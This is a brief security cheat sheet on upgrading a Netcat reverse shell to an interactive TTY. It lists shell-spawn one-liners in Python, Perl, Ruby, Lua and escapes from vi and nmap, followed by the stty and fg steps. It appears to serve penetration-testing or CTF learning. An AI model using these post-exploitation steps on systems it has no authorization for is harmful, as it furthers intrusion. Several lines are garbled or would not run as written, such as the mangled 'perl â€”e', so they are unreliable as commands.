# How to get a clean reverse shell ?

When obtaining a reverse shell with a Netcat listener, it is by default non-interactive and 
you cannot pass keyboard shortcuts or special characters such as tab.

It is quite simple to work around. For starters, in your shell, 
run 

```bash
python -c 'import pty;pty.spawn("/bin/bash");' 

python -c 'import pty; pty.spawn("/bin/sh")'

echo os.system('/bin/bash')

/bin/bash -i

perl â€”e 'exec "/bin/sh";'

perl: exec "/bin/sh";

ruby: exec "/bin/sh"

lua: os.execute('/bin/sh')

(From within IRB)

exec "/bin/sh"

(From within vi)

:!bash

(From within vi)

:set shell=/bin/bash:shell

(From within nmap)

!sh
```

to obtain a partially interactive bash shell.

After that, do CTRL+Z to background Netcat. Enter stty raw -echo in your terminal, which will tell your terminal to pass keyboard shortcuts etc. through. 
Once that is done, run the command fg to bring Netcat back to the foreground.
